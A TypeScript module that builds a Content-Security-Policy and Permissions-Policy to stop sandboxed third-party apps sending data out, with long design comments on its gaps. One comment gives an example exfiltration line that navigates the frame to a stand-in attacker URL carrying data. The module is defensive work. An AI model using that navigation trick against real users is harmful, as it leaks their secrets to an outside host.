/**
 * The **M3 (stranger-app) per-frame Content-Security-Policy** — the CSP half of
 * the `UI_AS_APPS_SPEC §G1a` egress containment (`TRUST_MODES_SPEC §6`, roadmap
 * R3-234; the sandbox-flag half shipped in R3-195).
 *
 * WHY IT LIVES HERE (and not in the host): the app runs *inside this document*
 * — the bundler evaluates the app's code in its own frame — so the only place a
 * per-frame CSP can be attached is the frame's own document. The host picks the
 * stance and therefore picks the document: an M3 frame is pointed at
 * `m3.html` (this policy, carried as a `<meta http-equiv>`), every other stance
 * keeps `index.html` (no CSP at all — M0–M2 must stay byte-identical, value 3).
 * The `<meta>` delivery is deliberate: Firebase-Hosting headers are prod-only, so
 * a header-only policy would be unverifiable on `local.immediately.run`. The
 * hosting header in `firebase.json` reinforces it in prod, it does not replace it.
 *
 * WHAT IT CONTAINS: the **bulk/streaming** egress channels a browser hands a
 * stranger's app for free — `fetch`/XHR/WebSocket/beacon (`connect-src`), pixel
 * exfil (`img-src`/`media-src`/`font-src`), native form POST (`form-action`),
 * and nested-frame GETs (`frame-src`).
 *
 * WHAT IT DOES NOT CONTAIN (booked, do NOT claim closed — §G1a / TRUST_MODES §6,
 * finding C1): frame **self-navigation** (`location = "https://attacker/?d=x"`)
 * is not CSP-blockable (`navigate-to` was dropped from CSP3). One-shot,
 * host-observable, carries a short secret. That is the browser-parity floor.
 *
 * ### The `connect-src 'none'` deviation (the R3-234 architectural finding)
 *
 * `§G1a` and `TRUST_MODES §6` write the M3 policy as `connect-src 'none'`. That
 * is not deliverable as written, and shipping it verbatim would break every M3
 * app rather than contain it: the app shares a document with the **bundler**, so
 * `connect-src` governs the bundler's own module loading too.
 *
 * Of the bundler's network paths, the *immutable* ones (`/package/`, unpkg,
 * the self-hosted SDK `/v/`) are already forwarded to the parent over the
 * `MessagePort` (`utils/fetch.ts` `fetchViaParent`), and a `MessagePort` is not
 * CSP-governed — those are genuinely free. But **dependency resolution is not**:
 * `/dep_tree/<payload>` resolves semver ranges, so it is deliberately excluded
 * from the immutable-fetch allowlist on both ends and is issued as a direct
 * `fetch` from this document. So is the esm.sh fallback. `connect-src 'none'`
 * would therefore break any M3 app that declares a dependency.
 *
 * The resolution is the one the roadmap item names: allowlist **exactly the
 * bundler's own module origins**, path-scoped where the endpoints allow it, and
 * nothing else. The residual is the same one `HOST_ORIGIN_HARDENING §2.1`
 * already books for the host document — these are generic content hosts, so
 * `connect-src` *constrains* egress, it does not *prevent* it — but it is much
 * narrower here: an M3 app can only issue GETs to four third-party module hosts
 * whose logs the app's author cannot read. Bulk exfil to an
 * **attacker-controlled** endpoint is blocked, which is the §G1a claim.
 *
 * The forward path to a literal `'none'` is `PRETRANSPILED_ARTIFACTS_SPEC`
 * (fewer CDN round-trips) plus moving `/dep_tree/` behind a parent-mediated
 * protocol; both are out of this item's scope (the second lives in the sandpack
 * fork, not here).
 */

/**
 * Every origin (path-scoped where the endpoint allows it) this document must be
 * able to reach with a direct `fetch` for an app to boot.
 *
 * KEEP IN SYNC WITH THE CODE THAT FETCHES THEM — `m3Csp.test.ts` asserts this,
 * reading the constants out of the modules themselves rather than restating
 * them, so a changed CDN root fails the suite instead of silently breaking
 * every M3 app in production.
 */
export const M3_CONNECT_SOURCES: readonly string[] = [
  // This document's own origin: the error overlay re-fetches sources and source
  // maps relative to the frame (`error-listener/`). Serving our own static
  // assets to ourselves is not an exfil channel.
  "'self'",
  // Blob/data URLs the bundler mints for app assets and workers.
  'blob:',
  'data:',
  // Dependency resolution (`module-cdn.ts` `fetchManifest`) — NOT parent-mediated,
  // because a `/dep_tree/` response changes as new versions publish.
  'https://sandpack-cdn-staging.blazingly.io/dep_tree/',
  // Exact-versioned package bundles (`module-cdn.ts` `fetchModule`). Normally
  // served through the parent's immutable-fetch bridge; this entry keeps the
  // documented direct-fetch fallback working when the bridge is unavailable.
  'https://sandpack-cdn-staging.blazingly.io/package/',
  // Registry file reads (`FileSystem/RegistryFS.ts`) — same bridge, same fallback.
  'https://unpkg.com/',
  // The esm.sh fallback for packages the primary CDN cannot resolve
  // (`module-registry/esm-fallback.ts`). Always a direct fetch.
  'https://esm.sh/',
  // The self-hosted, versioned SDK builds (`bundler.ts` SELF_HOST_BASES).
  'https://immediately-run.github.io/immediately-run-sdk/',
];

/**
 * The M3 policy, directive by directive.
 *
 * `default-src 'none'` is the §G1a baseline; every directive below it exists
 * because the *bundler* — not the app — needs it. Note that `script-src` is
 * deliberately permissive (`'unsafe-eval'` for evaluating the app's transpiled
 * modules, `'unsafe-inline'` for parcel's emitted import map): this policy is an
 * **egress** control, not a code-execution control. An M3 app is supposed to run
 * its own code; §G1a's promise is that it cannot ship what it sees anywhere.
 */
export const M3_CSP_DIRECTIVES: ReadonlyArray<readonly [string, readonly string[]]> = [
  ['default-src', ["'none'"]],
  ['script-src', ["'self'", "'unsafe-inline'", "'unsafe-eval'", 'blob:', 'data:']],
  ['worker-src', ["'self'", 'blob:']],
  ['style-src', ["'self'", "'unsafe-inline'", 'blob:', 'data:']],
  ['img-src', ["'self'", 'blob:', 'data:']],
  ['media-src', ["'self'", 'blob:', 'data:']],
  ['font-src', ["'self'", 'blob:', 'data:']],
  ['connect-src', M3_CONNECT_SOURCES],
  ['frame-src', ["'none'"]],
  ['child-src', ["'none'"]],
  ['object-src', ["'none'"]],
  ['base-uri', ["'none'"]],
  ['form-action', ["'none'"]],
];

/** The serialized policy, as it appears in `m3.html` and in the prod header. */
export const buildM3Csp = (): string =>
  M3_CSP_DIRECTIVES.map(([name, sources]) => `${name} ${sources.join(' ')}`).join('; ');

/**
 * The `Permissions-Policy` served alongside the M3 document (prod header only —
 * `Permissions-Policy` has no `<meta>` form). Defence in depth: R3-195 already
 * emits the M3 iframe with an EMPTY `allow` attribute, which is what actually
 * denies these features; this makes the document deny them on its own too.
 */
export const M3_PERMISSIONS_POLICY = 'camera=(), microphone=(), geolocation=(), display-capture=(), midi=(), usb=()';
